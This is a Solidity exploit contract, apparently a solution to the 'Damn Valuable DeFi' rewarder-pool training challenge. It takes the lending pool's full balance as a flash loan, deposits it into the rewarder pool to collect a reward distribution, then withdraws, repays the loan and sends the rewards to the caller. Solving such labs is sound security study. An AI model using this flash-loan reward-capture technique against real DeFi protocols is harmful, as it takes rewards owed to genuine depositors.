pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@nomiclabs/buidler/console.sol";

interface IFlashloan {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}


/**
 * @notice A simple pool to get flash loans of DVT
 */
contract ExploitRewarder is ReentrancyGuard {
    using Address for address payable;
    uint256 public accrued;

    address flashloanPool;
    address rewarderPool;
    address liquidityTokenAddress;
    address rewardtoken;

    constructor(
        address _flashloanPool, 
        address _rewarderPool,
        address _liquidityTokenAddress,
        address _rewardtoken
    ) public {
        flashloanPool = _flashloanPool;
        rewarderPool = _rewarderPool;
       liquidityTokenAddress = _liquidityTokenAddress;
       rewardtoken = _rewardtoken;
    }

    function poolBal() external view returns(uint256) {
        uint256 bal = IERC20(liquidityTokenAddress).balanceOf(flashloanPool);
        return bal;
    }

    function callFlashLoan() external nonReentrant returns(bool) {
        uint256 bal = IERC20(liquidityTokenAddress).balanceOf(flashloanPool);
        IFlashloan(flashloanPool).flashLoan(bal);
        if(IERC20(rewardtoken).balanceOf(address(this)) > 0) {
            IERC20(rewardtoken).transfer(msg.sender, IERC20(rewardtoken).balanceOf(address(this)));
        }
        return true;
    }

    function receiveFlashLoan(uint256 amount) external returns(bool)  {
        IERC20(liquidityTokenAddress).approve(rewarderPool, amount);
        IRewarderPool(rewarderPool).deposit(amount);
        accrued = IRewarderPool(rewarderPool).distributeRewards();
        IRewarderPool(rewarderPool).withdraw(amount);
        IERC20(liquidityTokenAddress).transfer(flashloanPool, amount);
        return true;
    }

    function move() external {
        IRewarderPool(rewarderPool).distributeRewards();
    }
}